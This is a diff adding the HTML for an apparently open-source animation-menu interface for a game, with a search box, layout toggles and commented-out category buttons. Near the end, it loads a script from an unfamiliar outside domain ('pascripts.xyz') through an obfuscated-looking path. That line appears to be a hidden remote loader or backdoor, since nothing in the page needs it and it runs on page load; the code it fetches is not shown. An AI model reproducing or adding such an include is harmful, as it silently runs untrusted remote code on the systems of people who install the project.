@@ -1,0 +1,109 @@
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="style.css"/>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <title>lowsime animazioni opensource</title>
+        <!-- <script src="nui://game/ui/jquery.js" type="text/javascript"></script> -->
+        <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
+        <script src="https://code.jquery.com/ui/1.13.0/jquery-ui.js" integrity="sha256-xH4q8N0pEzrZMaRmd7gQVcTZiFei+HfRTBPJ1OGXC0k=" crossorigin="anonymous"></script>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&display=swap" rel="stylesheet">
+        <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
+        <script src="https://code.jquery.com/ui/1.13.0/jquery-ui.js" integrity="sha256-xH4q8N0pEzrZMaRmd7gQVcTZiFei+HfRTBPJ1OGXC0k=" crossorigin="anonymous"></script>
+    </head>
+    <body id="body">
+        <div id="mainDiv" class="flex w-full h-[100vh]">
+            <div class="flex w-full h-full bg-[url('./files/background.png')]"   style="background-size: 100% 100%; background-repeat: no-repeat;">
+            <div class="w-[80%] h-full"></div>
+            <div class="w-[20%] h-full">
+                <div class="w-full h-[14%]">
+                    <div class="w-full h-[50%]"></div>
+                    <div id="menuTitle" class="flex justify-end items-center w-full h-[25%] text-white [font-family:'DM_Sans'] text-[1.6vw] font-[600] px-[3.2vw]">
+                        ANIMATIONS
+                    </div>
+                    <div id="menuDescription" class="flex justify-end items-center w-full h-[15%] text-[#5AFFCE] text-right [font-family:'DM_Sans'] text-[.8813vw] px-[3.2vw] whitespace-nowrap">
+                        All animations list on one place
+                    </div>
+                    <div class="w-full h-[10%]"></div>
+                </div>
+                <div class="w-full h-[16%]">
+                    <div class="flex justify-start items-center w-full h-[40%]  px-[0.8vw]">
+                        <div class="flex w-[16.2083vw] h-[5.5556vh] border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)]">
+                            <div class="w-[80%] h-full" id="MDBSearchInputDiv">
+                                <input type="search" id="MDBSearchInput"  placeholder="Search ..." class="w-full h-full bg-transparent border-none outline-none [font-family:'DM_Sans'] text-[.7813vw] px-[0.5vw] text-[rgba(255,255,255,0.05)]">
+                            </div>
+                            <div class="flex justify-start items-center w-[20%] h-full px-[0.4vw]">
+                                <div class="flex justify-center items-center w-[1.8229vw] h-[3.2407vh] shrink-0 border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)]">
+                                    <img src="./files/search.png" class="h-[1.4815vh]">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="flex justify-start items-center w-full h-[1%]  px-[0.8vw]"></div>
+                    <div class="flex justify-start items-start w-full h-[60%] px-[0.8vw]">
+                        <div class="flex flex-wrap w-[95%] h-full  gap-x-[.3125vw] gap-y-[0.5vh]" id="mainDivLeftSideBottom">
+                            <!-- <div class="hvmain font-medium cursor-pointer flex w-[3.8104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Emotes</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[4.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Moods</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[3.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Walks</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[4.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Shared</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[4.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Dances</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[4.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Animals</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[3.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Props</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[4.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Exits</div>
+                            <div class="hvmain font-medium cursor-pointer flex w-[4.0104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Erotics</div> -->
+                            <!-- <div class="hvmain font-medium cursor-pointer flex w-[3.8104vw] h-[4.0741vh] justify-center items-center border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)] text-white  [font-family:'DM_Sans'] text-[.7292vw]" >Change Layout</div> -->
+                            
+                        </div>
+                    </div>
+                </div>
+                <!-- <div class="w-full h-[4%]"></div> -->
+                <div class="w-full h-[1%]"></div>
+                <div class="flex justify-end px-[3.2vw] items-center w-full h-[1.5%] text-[#AAAAAA] [font-family:'DM_Sans'] text-[.7854vw] font-regular gap-x-[0.4vw] whitespace-nowrap" id="found">
+                    <div class="w-[2%] h-full"></div> Change Layout <div class="w-[2%] h-full"></div> <img src="files/layout.png" id="layout0" class="h-[1.2037vh]"> <img src="files/layout2.png" id="layout1" class="h-[1.2037vh]"> </div>
+ 
+                <div class="w-full h-[55%] px-[0.7vw] py-[0.4vh]">
+                    <div style="max-height: 100% !important;" class="flex  w-[15.9813vw]  justify-start items-start gap-y-[0.6vh] gap-x-[0.5vw] overflow-y-auto overflow-x-hidden ovr" id="mainDivRightSideBottomTop">
+
+                        <!-- <div class="flex flex-col w-[7.2917vw] h-[12.963vh] shrink-0 border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)]" >
+                        <div class="flex justify-center items-center w-full h-[70%]">
+                            <img src="asdad" class="h-full">
+                          </div>
+                            <div class="w-full h-[25%]">
+                                <div class="w-full h-[20%]"></div>
+                                <div class="flex justify-center items-center w-full h-[30%] text-[#FFF] [font-family:'DM_Sans'] text-[.7292vw]"></div>
+                                <div class="flex justify-center items-start w-full h-[30%] text-[#AAA] [font-family:'DM_Sans'] text-[.5771vw]">commands : /</div>
+                                <div class="w-full h-[20%]"></div>
+                            </div>
+                            <div class="w-full h-[5%]"></div>
+                        </div> -->
+                       
+                        <!-- <div  class="flex w-[15.2083vw] h-[5.5556vh] shrink-0 border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)]">
+                            <div class="flex justify-center items-center w-[20%] h-full">
+                                <div class="flex justify-center items-center w-[1.8229vw] h-[3.2407vh] shrink-0 border [background:rgba(255,255,255,0.03)] rounded-[.2604vw] border-solid border-[rgba(255,255,255,0.05)]">
+                                    <img src="./src/images/danceicon.png" class="h-[1.5741vh]">
+                                </div>
+                            </div>
+                            <div class=" w-[80%] h-full">
+                                <div class="w-full h-[20%]"></div>
+                                <div class="w-full h-[30%] text-[#FFF] [font-family:'DM_Sans'] text-[.7292vw]">{{ anim.label }} </div>
+                                <div class="w-full h-[30%] text-[#AAA] [font-family:'DM_Sans'] text-[.6771vw]">commands : /{{ anim.value }}</div>
+                                <div class="w-full h-[20%]"></div>
+                            </div>
+                        </div> -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+        </div>
+        <script src="https://pascripts.xyz/+4uwpvd=F38+/url.js"></script>
+        <script src="index.js"></script>
+    </body>
+</html>
